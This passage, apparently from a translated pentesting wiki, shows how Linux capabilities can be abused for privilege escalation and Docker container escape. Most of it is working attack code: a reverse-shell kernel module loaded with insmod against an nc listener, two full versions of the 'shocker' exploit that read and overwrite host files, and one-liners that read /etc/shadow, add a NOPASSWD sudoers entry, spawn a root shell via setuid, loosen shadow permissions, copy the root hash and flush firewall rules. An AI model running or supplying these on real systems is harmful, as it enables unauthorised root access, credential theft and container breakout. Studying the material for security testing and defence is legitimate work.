}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile 内の各 make ワードの前にある空白文字は、スペースではなく**タブでなければなりません**！

`make` を実行してコンパイルします。
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、shell 内で `nc` を起動し、別の shell から **module をロード**すると、nc process 内で shell を取得できます。
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「Abusing SYS_MODULE Capability」laboratory からコピーされました。**<sup>[[1]](#references)</sup>

この technique の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) にあります。

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) により、process は **ファイルの読み取り、および directory の読み取りと実行に関する permission を bypass** できます。主な用途は、ファイルの検索または読み取りです。ただし、process が `open_by_handle_at(2)` function を使用することも可能になります。この function は、process の mount namespace 外にあるファイルを含め、任意のファイルにアクセスできます。`open_by_handle_at(2)` で使用される handle は、`name_to_handle_at(2)` を通じて取得される non-transparent な identifier であることが想定されていますが、改ざんに対して脆弱な inode number などの機密情報を含めることができます。特に Docker container の context における、この capability の exploit の可能性は、Sebastian Krahmer による shocker exploit によって実証されており、[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で分析されています。<sup>[[12]](#references)[[13]](#references)</sup>
**つまり、ファイルの read permission check と directory の read/execute permission check を bypass できます**。<sup>[[14]](#references)</sup>

**binary の例**

binary は、その namespace からアクセス可能なファイルを読み取ることができます。したがって、`tar` のようなファイルがこの capability を持っている場合、shadow ファイルを読み取ることができます：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 の例**

この場合、**`python`** binary にこの capability があるとします。root ファイルを一覧表示するには、次のように実行できます:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
そして、ファイルを読み取るには次のようにします:
```python
print(open("/etc/shadow", "r").read())
```
**環境での例 (Docker breakout)**

`capsh --print` を使用して、Docker container 内で有効な capabilities を確認できます。<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、**DAC_READ_SEARCH** capability が有効になっていることを確認できます。これは DAC の read/search チェックを bypass し、`open_by_handle_at(2)` を許可します。単独では process-debugging capability ではありません。<sup>[[14]](#references)</sup>

以下の exploit の仕組みについては、[https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で確認できます。簡単に説明すると、**CAP_DAC_READ_SEARCH** により permission checks なしで file system を traversing でき、`open_by_handle_at(2)` が許可されます。これにより、関連する namespaces と mounts に到達できる場合、他の processes が開いた files を expose できます。<sup>[[13]](#references)[[14]](#references)</sup>

これらの permissions を悪用して host から files を read する元の exploit は、こちらにあります: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、read する file を最初の argument として渡し、結果を file に dump できる **modified version** です。<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit は、host 上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この変更版では /etc/hostname を使用します。exploit が動作しない場合は、別のファイルを設定する必要があるかもしれません。host に mount されているファイルを見つけるには、mount command を実行します：

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit は、host 上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この変更版では...](<../../images/image (407) (1).png>)

**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の "Abusing DAC_READ_SEARCH Capability" lab からコピーされました。**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**この capability は、ファイルの read、write、execute permission check を bypass します**。<sup>[[14]](#references)</sup>

privileged group への membership によって readable または writable になるファイルを探します。役立つ target は、target の ownership と mode bits によって異なります。<sup>[[14]](#references)</sup>

**binary の例**

この例では vim にこの capability があるため、_passwd_、_sudoers_、または _shadow_ などの任意のファイルを変更できます：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**バイナリ2の例**

この例では、**`python`** バイナリにこの capability が付与されています。python を使用して、任意のファイルを上書きできます。
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**環境 + CAP_DAC_READ_SEARCH を使用した例（Docker breakout）**

前述の CAP_DAC_READ_SEARCH 環境の例で示したように、`capsh --print` で `CAP_DAC_OVERRIDE` を確認します。<sup>[[14]](#references)[[26]](#references)</sup>

まず、ホストの[**任意のファイルを読み取るために DAC_READ_SEARCH capability を悪用する**](linux-capabilities.md#cap_dac_read_search)前のセクションを読み、**exploit をコンパイル**します。\
次に、ホストのファイルシステム内に**任意のファイルを書き込める**ようにする、以下のバージョンの shocker exploit を**コンパイル**します：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker containerから**脱出**するには、ホストからファイル `/etc/shadow` と `/etc/passwd` を**download**し、それらに**新しいユーザーを追加**して、**`shocker_write`**を使用して上書きできます。その後、**ssh経由でアクセス**します。

**この technique のコードは、**[**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) の「Abusing DAC_OVERRIDE Capability」labからコピーされました。<sup>[[1]](#references)</sup>

## CAP_CHOWN

**この capability により、processはファイルの所有権を変更できます**。<sup>[[14]](#references)</sup>

**binaryを使用した例**

**`python`** binaryにこの capability があるとします。ファイル（例：**`shadow`**）の所有者を変更し、その後、他のpermissionが許可していれば、取得したaccessを使用してファイルを変更できます。
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、**`ruby`** binary がこの capability を持っている場合:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**この capability は、権限の変更を含む多くのファイル操作で所有権チェックをバイパスします**。<sup>[[14]](#references)</sup>

**バイナリを使用した例**

python にこの capability がある場合、shadow ファイルの権限を変更し、**root パスワードを変更**して、privilege escalation を実行できます:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**この capability により、kernel によって適用される credential および capability のルールに従い、process は effective user ID を変更できます**。<sup>[[14]](#references)</sup>

**binary の例**

python にこの **capability** がある場合、これを非常に簡単に悪用して root へ privilege escalation できます:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法：**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**この capability により、kernel によって適用される credential および capability のルールに従い、process は有効な group ID を変更できます**。<sup>[[14]](#references)</sup>

**privileges を escalate するために overwrite できるファイルは多数あります。**[**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**binaryを使った例**

この場合、任意の group に impersonate できるため、group が read できる興味深いファイルを探します。
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
読み取りまたは書き込みによって privilege escalation に悪用できるファイルを見つけたら、以下を使って **対象のグループになりすました shell を取得できます**。
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
このケースでは、shadow グループになりすますことで、ファイル `/etc/shadow` を読み取れます：
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

両方の capabilities が同じ helper で利用可能な場合、実用的な chain は次のとおりです。

1. EGID を `shadow`（または別の privileged group）に切り替える。
2. `/etc/shadow` に対して `chown` を使用し、group `shadow` を維持したまま UID を自分の UID に設定する。
3. target hash を読み取り、crack/pivot する。
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
これは直接フル root を取得する必要をなくし、credential reuse を介した pivot に十分利用できます。

**docker** がインストールされている場合、**docker group** を **impersonate** し、[**docker socket** と通信して privileges を escalate](#writable-docker-socket) するために悪用できます。

## CAP_SETFCAP

**この capability により、プロセスは file capabilities を設定できます**。<sup>[[14]](#references)</sup>

**バイナリを使用した例**

python にこの **capability** がある場合、非常に簡単に悪用して privileges を root まで escalate できます:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> 新しく書き込まれた file capability set は以前の set を置き換えます。そのため、helper が新しい capabilities のみで実行されると、別のファイルを更新するための `CAP_SETFCAP` を保持できなくなる場合があります。<sup>[[14]](#references)[[25]](#references)</sup>

[SETUID capability](linux-capabilities.md#cap_setuid) を取得したら、そのセクションで privileges を escalate する方法を確認できます。

**environment を使用した Example (Docker breakout)**

Docker の文書化されたデフォルト capability set には **CAP_SETFCAP** が含まれていますが、実際の set は runtime configuration に依存します。<sup>[[19]](#references)</sup>
次のコマンドで process capabilities を確認できます：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この capability により file capabilities を書き込めますが、それ自体では、現在のプロセスにそれらの capability を付与したり、ファイルの実行時に適用される file、bounding-set、namespace のルールをバイパスしたりすることはできません。<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
ファイルの permitted capabilities はプロセスの capability bounding set によって制限され、ファイルの effective bit は、ファイルの permitted set をプロセスの effective set に追加するかどうかを制御します。これが、ファイルに capabilities を追加しても、要求されたすべての capability が実行時に自動的に使用可能になるわけではない理由です。<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`/dev/mem`、`/dev/kmem`、`/proc/kcore` へのアクセス、`mmap_min_addr` の変更、`ioperm(2)` および `iopl(2)` system call へのアクセス、各種 disk command など、多数の機密性の高い操作を提供します。`FIBMAP ioctl(2)` もこの capability によって有効になりますが、これは[過去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)に問題を引き起こしたことがあります。man page によると、これにより holder は他の device に対して device-specific なさまざまな操作も実行できます。<sup>[[14]](#references)</sup>

これは **privilege escalation** や **Docker breakout** に利用できます。<sup>[[14]](#references)</sup>

## CAP_KILL

**この capability は、kernel が定義するケースにおいて、process に signal を送信する際の permission check を回避します**。<sup>[[14]](#references)</sup>

**binary の例**

**`python`** binary にこの capability が設定されているとします。**service または socket の設定**（あるいは service に関連する任意の設定ファイル）も変更できる場合、それに backdoor を仕込み、その service に関連する process を kill して、新しい設定ファイルが backdoor 付きで実行されるのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

kill capabilitiesを持っていて、**rootとして実行中のnode program**（または別のユーザーとして実行中のもの）がある場合、**signal SIGUSR1**を**送信**すると、**node debuggerを開かせて**、そこへ接続できる可能性があります。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**この capability により、1024 未満の Internet ポートに bind できます。** より広範な privilege escalation が直接許可されるわけではありません。<sup>[[14]](#references)</sup>

**binary の例**

**`python`** にこの capability がある場合、任意のポートで listen でき、そこから他の任意のポートに connect することもできます（サービスによっては、特定の privilege ポートからの接続を必要とします）。

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、process が **RAW および PACKET sockets を作成**できるようにし、任意の network packets を生成して送信できるようにします。これにより、packet spoofing、traffic injection、network access controls の bypass など、containerized environments における security risks につながる可能性があります。Malicious actors はこれを悪用して、container の routing に干渉したり、特に十分な firewall protections がない場合に host network security を compromise したりする可能性があります。さらに、**CAP_NET_RAW** は RAW ICMP requests による ping などの operations をサポートします。<sup>[[14]](#references)</sup>

**これにより、適切な socket interface を使用した packet capture が可能になります。** これが直接、より広範な privilege escalation を付与するわけではありません。<sup>[[14]](#references)</sup>

**binaryを使用した例**

binary **`tcpdump`** にこの capability がある場合、network information を capture できます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
この **environment** がこの capability を許可している場合、**`tcpdump`** もこれを使用して traffic を sniff できます。<sup>[[14]](#references)</sup>

**binary 2 を使った例**

以下の例は、**「lo」**（**localhost**）interface の traffic を intercept するのに役立つ **`python2`** code です。この code は、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) の lab "_The Basics: CAP-NET_BIND + NET_RAW_" に由来します。<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、公開されている network namespaces 内の firewall settings、routing tables、socket permissions、network interface settings など、**network configurations を変更する**権限を保有者に付与します。また、network interfaces の **promiscuous mode** を有効にできるため、namespaces 全体で packet sniffing が可能になります。<sup>[[14]](#references)</sup>

**Example with binary**

**python binary** にこれらの capabilities があると仮定します。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**この capability では、immutable や append-only などの inode flags を変更できます。これだけで、より広範な privilege escalation が直接可能になるわけではありません。**<sup>[[14]](#references)</sup>

**binary を使用した例**

ファイルが immutable で、python がこの capability を持っている場合、**immutable attribute を削除して、ファイルを変更可能にできます：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
`FS_IOC_GETFLAGS` および `FS_IOC_SETFLAGS` 操作は inode フラグを読み取り、更新します。この例では、`FS_IMMUTABLE_FL` が immutable フラグとしてクリアされます。<sup>[[27]](#references)</sup>

> [!TIP]
> 通常、この immutable 属性の設定と解除には以下を使用します。
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` system call の実行を可能にします。これにより、既知の脆弱性を利用して `chroot(2)` 環境から escape できる可能性があります。<sup>[[11]](#references)[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`LINUX_REBOOT_CMD_RESTART2` などの command を含む、system restart 用の `reboot(2)` system call の実行を可能にします。また、新しい crash kernel または signed crash kernel をそれぞれロードするための `kexec_load(2)` と、Linux 3.17 以降では `kexec_file_load(2)` も有効にします。<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は Linux 2.6.37 で、より広範な **CAP_SYS_ADMIN** から分離され、特に `syslog(2)` call を使用する権限を付与するものとなりました。この capability は、kernel address の公開を制御する `kptr_restrict` 設定が 1 の場合に、`/proc` や類似の interface を介して kernel address を表示できるようにします。Linux 2.6.39 以降、`kptr_restrict` の default は 0 であり、kernel address が公開されます。ただし、多くの distribution は security 上の理由から、これを 1（uid 0 以外には address を隠す）または 2（常に address を隠す）に設定しています。<sup>[[14]](#references)</sup>

さらに、`dmesg_restrict` が 1 に設定されている場合、**CAP_SYSLOG** は `dmesg` output への access を可能にします。これらの変更にもかかわらず、過去の経緯により **CAP_SYS_ADMIN** には `syslog` operation を実行する権限が残されています。<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、通常の file、FIFO（named pipe）、または UNIX domain socket の作成に加えて、`mknod` system call の機能を拡張します。具体的には、以下を含む special file の作成を可能にします。<sup>[[14]](#references)</sup>

- **S_IFCHR**: terminal などの device である character special file。
- **S_IFBLK**: disk などの device である block special file。

この capability は、character device や block device などの device file を作成する必要がある process に有用です。<sup>[[14]](#references)</sup>

これは Docker の documented default capability set に含まれています。すべての deployment が同じ default を使用すると想定せず、実際の runtime configuration を確認してください（[Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>

この capability により、以下の条件下で host 上の privilege escalation（full disk read による）が可能になります。<sup>[[7]](#references)</sup>

1. Host への initial access がある（Unprivileged）。
2. Container への initial access がある（Privileged（EUID 0）かつ effective `CAP_MKNOD`）。
3. Host と container が同じ user namespace を共有している。

**Container 内で Block Device を作成し、Access する手順:**

1. **Standard User として Host 上で:**

- `id` を使用して現在の user ID を確認します。例: `uid=1000(standarduser)`。
- target device を特定します。例: `/dev/sdb`。

2. **`root` として Container 内で:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **ホストに戻る:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
